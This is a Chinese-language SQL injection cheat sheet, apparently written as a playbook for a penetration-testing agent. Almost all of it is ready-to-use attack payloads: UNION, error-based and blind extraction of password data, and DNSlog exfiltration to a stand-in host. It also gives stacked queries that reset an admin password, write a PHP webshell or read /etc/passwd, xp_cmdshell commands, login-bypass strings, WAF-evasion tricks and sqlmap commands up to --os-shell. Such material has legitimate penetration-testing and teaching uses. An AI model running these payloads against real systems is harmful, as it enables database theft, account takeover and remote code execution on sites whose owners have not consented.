# SQL 注入 (SQL Injection)

通过在用户输入中注入 SQL 代码，操纵数据库查询，实现数据泄露、认证绕过或命令执行。

## 决策策略

### 三层推理
- **fact**: 直接观察到的行为（响应内容、错误信息、SQL报错）
- **hypothesis**: 猜测（未经证实）
- **decision**: 下一步行动

### 最短探针原则
先确认假设，再深入攻击。SQLi 最短探针顺序：
1. `id=1'` → 确认是否有SQL报错
2. `id=1 AND 1=1` vs `id=1 AND 1=2` → 确认逻辑差异
3. 再尝试 UNION 或盲注

### 切换规则
探针无差异时：
- 尝试不同报错方式（单引号，双引号、注释）
- 尝试时间盲注（sleep/BENCHMARK）
- 尝试不同参数（POST/JSON/Cookie）
- 换用 sqlmap 自动检测

## 常见指示器

- URL 参数（id=, page=, search=, sort=, order=）
- 搜索框、登录表单
- Cookie 中的参数
- HTTP 头（User-Agent, Referer, X-Forwarded-For）
- JSON/XML 请求体中的参数
- 数字型或字符串型参数

## 检测方法

### 1. 基础测试

```bash
# 单引号测试
curl "http://target.com/page?id=1'"

# 双引号测试
curl "http://target.com/page?id=1\""

# 注释测试
curl "http://target.com/page?id=1--"
curl "http://target.com/page?id=1#"

# 逻辑测试
curl "http://target.com/page?id=1 AND 1=1"
curl "http://target.com/page?id=1 AND 1=2"
```

### 2. 时间盲注测试

```bash
# MySQL
curl "http://target.com/page?id=1 AND SLEEP(5)"

# PostgreSQL
curl "http://target.com/page?id=1; SELECT pg_sleep(5)"

# MSSQL
curl "http://target.com/page?id=1; WAITFOR DELAY '0:0:5'"
```

## 攻击向量

### UNION 注入

```sql
-- 确定列数
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- 快速探测字段数上限
1" order by 100--+  // 出现错误即达临界值

-- 确定显示位（用-1让原始查询无结果）
-1" union select 1,2,3--+

-- 提取数据
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,column_name,3 FROM information_schema.columns--

-- MySQL 信息收集
' UNION SELECT @@version,user(),database()--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--

-- 数据枚举（带分隔符）
-1" union select 1,group_concat(col1,0x3a,col2),3 from dbName.tableName--+
// 0x3a为冒号分隔符

-- 宽字节注入（GBK编码场景）
1%df' union select 1,database(),3--+
// %df与'拼接逃逸单引号过滤

-- 表名用16进制编码绕过字符串过滤
1' union/**/select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x64767761--+
// 0x64767761=dvwa

-- 大小写混合绕过union/select关键字过滤
1' UNIOn SEleCT 1,current_user(),3--+
```

### 报错注入

```sql
-- MySQL extractvalue
' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--
' AND extractvalue(1,concat(0x3a,(select database())))--+  // 报错泄露当前库名
' AND extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema like 'dbName')))--+  // 枚举表名

-- MySQL updatexml
' AND updatexml(1,concat(0x7e,database(),0x7e),1)--  // 报错泄露数据库名
' AND updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='dbName' limit 1,1),0x7e),1)--  // 读取第2个表名

-- MySQL floor函数报错
' AND (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.columns group by x)tmp)--  // 利用group by重复值报错

-- MySQL BigInt溢出报错
' AND exp(~(select * from (select current_user())tmp))--  // 泄露当前用户

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS INT)--

-- MSSQL
' AND 1=CONVERT(INT,(SELECT @@version))--
```

### 布尔盲注

```sql
-- 判断条件
' AND 1=1--  (正常)
' AND 1=2--  (异常)

-- 逐字符提取
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--

-- 二分法
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--

-- 数据库信息探测
' AND LENGTH((SELECT database())) = 8--
' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 95--

-- 二分搜索示例
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--
```

### 时间盲注

```sql
-- MySQL
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- MySQL 进阶
' AND IF(LENGTH(database())=8,SLEEP(3),1)--
' AND IF(ASCII(SUBSTRING(database(),1,1))=116,SLEEP(3),1)--

-- BENCHMARK 替代 SLEEP
'; IF((SELECT ASCII(SUBSTR((SELECT pwd FROM users WHERE uname='admin'),1,1))) = 104, BENCHMARK(8000000, MD5('x')), NULL)--
```

### DNSlog 盲注（无回显场景）

```sql
-- MySQL DNSlog泄露库名（Windows环境）
' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.xxx.dnslog.cn\\a'))--+

-- SQL Server DNSlog泄露库名
'; EXEC master..xp_dirtree '\\\\(SELECT db_name()).xxx.dnslog.cn\\c';--

-- PostgreSQL DNSlog
' AND (SELECT pg_read_file(CONCAT('\\\\',(SELECT current_database()),'.xxx.dnslog.cn\\d')))--
```

### 堆叠查询

```sql
-- MySQL (需要 mysqli_multi_query)
'; INSERT INTO users VALUES('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--

-- 基础信息查询
1"; show databases;--
1"; show tables from dbName;--
1"; show columns from tableName;--

-- 文件操作
1"; SELECT '<?php @eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php';--  // 写webshell
1"; LOAD_FILE('/etc/passwd');--  // 读文件

-- MSSQL
'; EXEC xp_cmdshell 'whoami'--

-- PostgreSQL
'; CREATE TABLE test(data text); COPY test FROM '/etc/passwd';--
```

### 认证绕过

```sql
-- 登录绕过
admin'--
admin'#
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR 1=1--
admin' OR '1'='1
' OR ''='

-- 密码字段绕过
' OR '1'='1
anything' OR '1'='1'--
```

## 绕过技术

### 空格绕过

```sql
-- 注释替代
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  -- Tab
SELECT%0ausername%0aFROM%0ausers  -- 换行

-- 括号
SELECT(username)FROM(users)
```

### 引号绕过

```sql
-- 十六进制
SELECT * FROM users WHERE username=0x61646d696e  -- 'admin'

-- CHAR 函数
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)
```

### 关键字绕过

```sql
-- 大小写混合
SeLeCt, UnIoN, FrOm

-- 双写
SELSELECTECT, UNUNIONION

-- 编码
%53%45%4c%45%43%54  -- SELECT

-- 注释分割
SEL/**/ECT, UN/**/ION
```

### WAF 绕过 Tamper 脚本

```bash
# 常用 tamper
--tamper=space2comment      # 空格转注释
--tamper=between            # 使用 BETWEEN 替代 >
--tamper=randomcase         # 随机大小写
--tamper=charencode         # URL 编码
--tamper=equaltolike        # = 转 LIKE
```

## 数据库特定语法

### MySQL

```sql
SELECT @@version
SELECT user()
SELECT database()
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
SELECT LOAD_FILE('/etc/passwd')
```

### PostgreSQL

```sql
SELECT version()
SELECT current_user
SELECT current_database()
SELECT datname FROM pg_database
SELECT tablename FROM pg_tables WHERE schemaname='public'
CREATE TABLE test(data text); COPY test FROM '/etc/passwd'; SELECT * FROM test;
```

### MSSQL

```sql
SELECT @@version
SELECT user_name()
SELECT db_name()
SELECT name FROM master..sysdatabases
SELECT name FROM sysobjects WHERE xtype='U'
EXEC xp_cmdshell 'whoami'
```

## sqlmap 使用

### 基础用法

```bash
sqlmap -u "http://target.com/page?id=1" --batch
sqlmap -u "http://target.com/page?id=1" -p id --batch
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch
```

### 数据提取

```bash
sqlmap -u "http://target.com/page?id=1" --dbs --batch
sqlmap -u "http://target.com/page?id=1" -D database_name --tables --batch
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns --batch
sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump --batch
```

### 高级选项

```bash
# 指定注入技术
sqlmap -u "http://target.com/page?id=1" --technique=BEUST --batch

# 绕过 WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between --batch

# 获取 shell
sqlmap -u "http://target.com/page?id=1" --os-shell --batch
```
